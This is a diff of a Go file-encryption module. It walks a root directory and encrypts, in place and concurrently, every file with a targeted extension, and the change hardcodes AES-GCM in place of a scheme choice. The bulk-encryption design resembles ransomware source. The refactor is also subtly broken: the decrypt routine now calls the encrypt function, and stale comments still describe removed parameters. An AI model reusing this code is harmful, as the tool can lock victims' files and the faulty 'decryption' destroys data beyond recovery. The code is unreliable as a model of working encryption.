@@ -9,28 +9,18 @@ import (
 	"github.com/awnumar/memguard"
 )
 
-type EncryptionScheme string
-type CryptFunc func(*sync.WaitGroup, string, []byte) error
-
-const (
-	AES256  EncryptionScheme = "aes-gcm256"
-	XCHACHA EncryptionScheme = "xchacha20poly1305"
-)
-
 // Encryptor struct holds all the functions and logic for encryption.
 type Encryptor struct {
-	encryptionScheme EncryptionScheme
 	wantedExtensions []string
 	key              *memguard.Enclave
 	rootDir          string
 	wg               *sync.WaitGroup
 }
 
-func (enc *Encryptor) NewWithScheme(dir string, scheme EncryptionScheme,
+func NewEncryptor(dir string,
 	key *memguard.Enclave, toEncrypt []string) *Encryptor {
 
 	return &Encryptor{
-		encryptionScheme: scheme,
 		rootDir:          dir,
 		key:              key,
 		wantedExtensions: toEncrypt,
@@ -53,16 +43,7 @@ func (enc *Encryptor) shouldEncrypt(path string) bool {
 	return false
 }
 
-func (enc *Encryptor) encMain() {
-	switch enc.encryptionScheme {
-	case AES256:
-		enc.encryptPath(aesgcmEncrypt)
-	case XCHACHA:
-		enc.encryptPath(XChachaEncrypt)
-	}
-}
-
-func (enc *Encryptor) encryptPath(fn CryptFunc) error {
+func (enc *Encryptor) Encrypt() error {
 	b, err := enc.key.Open()
 	if err != nil {
 		return err
@@ -82,7 +63,7 @@ func (enc *Encryptor) encryptPath(fn CryptFunc) error {
 		// check if the file should be encrypted
 		if enc.shouldEncrypt(path) {
 			enc.wg.Add(1)
-			go fn(enc.wg, path, b.Bytes())
+			go aesgcmEncrypt(enc.wg, path, b.Bytes())
 		}
 		return nil
 	}); err != nil {
@@ -93,34 +74,16 @@ func (enc *Encryptor) encryptPath(fn CryptFunc) error {
 	return nil
 }
 
-// EncryptRootWithScheme takes in an optional encryption scheme and then proceeds
-// to encrypt the root directory using that scheme.
-func EncryptRootWithScheme(rootDir string, scheme EncryptionScheme, key *memguard.Enclave) error {
-	switch scheme {
-	case AES256:
-		EncryptCommon(aesgcmEncrypt, rootDir, key)
-	case XCHACHA:
-		EncryptCommon(XChachaEncrypt, rootDir, key)
-	}
-
-	return nil
-}
-
 // DecryptRootWithScheme takes in a optional decryption scheme and then proceeds
 // to decrypt the root directory using that scheme.
-func DecryptRootWithScheme(rootDir string, scheme EncryptionScheme, key *memguard.Enclave) error {
-	switch scheme {
-	case AES256:
-		DecryptCommon(aesgcmEncrypt, rootDir, key)
-	case XCHACHA:
-		DecryptCommon(XChachaDecrypt, rootDir, key)
-	}
+func DecryptRootWithScheme(rootDir string, key *memguard.Enclave) error {
+	DecryptCommon(rootDir, key)
 	return nil
 }
 
 // EncryptCommon goes through all the files in a root directory and executes the given CryptFunc
 // on each file.
-func EncryptCommon(fn CryptFunc, rootDir string, key *memguard.Enclave) error {
+func EncryptCommon(rootDir string, key *memguard.Enclave) error {
 	var wg sync.WaitGroup
 
 	b, err := key.Open()
@@ -142,7 +105,7 @@ func EncryptCommon(fn CryptFunc, rootDir string, key *memguard.Enclave) error {
 		// check if the file should be encrypted
 		if ShouldEncrypt(path) {
 			wg.Add(1)
-			go fn(&wg, path, b.Bytes())
+			go aesgcmEncrypt(&wg, path, b.Bytes())
 		}
 		return nil
 	}); err != nil {
@@ -155,7 +118,7 @@ func EncryptCommon(fn CryptFunc, rootDir string, key *memguard.Enclave) error {
 
 // DecryptCommon goes through all the files in a root directory and executes the given CryptFunc
 // on each file.
-func DecryptCommon(fn CryptFunc, rootDir string, key *memguard.Enclave) error {
+func DecryptCommon(rootDir string, key *memguard.Enclave) error {
 	var wg sync.WaitGroup
 
 	b, err := key.Open()
@@ -175,7 +138,7 @@ func DecryptCommon(fn CryptFunc, rootDir string, key *memguard.Enclave) error {
 		}
 
 		wg.Add(1)
-		go fn(&wg, path, b.Bytes())
+		go aesgcmEncrypt(&wg, path, b.Bytes())
 		return nil
 	}); err != nil {
 		return err
